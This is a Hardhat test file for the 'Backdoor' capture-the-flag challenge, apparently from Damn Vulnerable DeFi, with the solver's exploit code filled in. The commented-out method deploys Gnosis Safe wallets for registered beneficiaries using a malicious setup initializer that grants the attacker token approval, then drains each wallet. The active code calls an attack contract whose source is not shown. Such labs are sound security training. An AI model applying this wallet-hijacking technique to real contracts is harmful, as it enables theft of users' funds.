const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // method 1：
        // const expFac = await ethers.getContractFactory('WalletRegistryExp',attacker)
        // const exp = await expFac.deploy();
        // const attackCalldata = exp.interface.encodeFunctionData("attack",[this.token.address, attacker.address]);
        // for (let user of [alice.address, bob.address, charlie.address, david.address]) {
        //     let initializer = this.masterCopy.interface.encodeFunctionData("setup",[
        //         [user],
        //         1,
        //         exp.address, // to
        //         attackCalldata,
        //         ethers.constants.AddressZero,
        //         ethers.constants.AddressZero,
        //         0,
        //         ethers.constants.AddressZero
        //     ])
        //     let tx = await this.walletFactory.connect(attacker).createProxyWithCallback(
        //         this.masterCopy.address,
        //         initializer,
        //         0,
        //         this.walletRegistry.address
        //     )
        //     let txr = await tx.wait();
        //     let proxy;
        //     txr.logs.forEach(log => {
        //         if (log.topics[0] == this.walletFactory.interface.getEventTopic('ProxyCreation')) 
        //             proxy = this.walletFactory.interface.decodeEventLog("ProxyCreation",log.data,log.topics)['proxy']
               
        //     })
        //     await  this.token.connect(attacker).transferFrom(proxy, attacker.address, ethers.utils.parseEther("10"));
        // }



        const expFac = await ethers.getContractFactory('WalletRegistryExp',attacker)
        const exp = await expFac.deploy(this.masterCopy.address, this.walletRegistry.address);
        await exp.connect(attacker).initAttack(this.token.address, attacker.address, this.walletFactory.address, users);

       
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
